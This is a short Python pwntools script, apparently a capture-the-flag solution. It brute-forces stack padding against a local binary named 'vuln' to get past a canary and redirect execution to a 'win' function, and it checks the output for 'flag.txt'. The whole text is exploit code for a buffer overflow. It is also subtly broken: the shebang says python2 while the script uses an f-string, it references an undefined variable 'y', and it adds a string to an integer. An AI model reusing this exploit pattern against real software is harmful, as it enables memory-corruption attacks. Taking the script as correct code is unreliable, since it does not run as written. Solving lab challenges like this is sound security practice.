#!/usr/bin/env python2

from pwn import *

padding = 63
canary = [0x00]
objects = "qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVNM"
obl = list(objects)

binary = ELF('./vuln')

win = binary.symbols['win']
print(hex(win))
payload = (padding * 'a').encode() + '\x0012f4'.encode() 
canary = ""

for x in range(1000):
    p = process("vuln")
    p.clean()
#    print(p.recvline())
    p.send('100000\n')
    p.clean()
    payload_hold = payload + b'B'*x + p32(win)
    p.send(payload_hold)
    wrote = ""
    wrote = p.recvline()
    print(b"Heres the payload: "+payload_hold)
    print(wrote)
    if b'flag.txt' in wrote:
        payload = payload_hold
        log.info(f"updated payload {payload}")
        canary += y
        print("how much padding: " +x)
        break
    else:
        print("wrong")
    p.close()
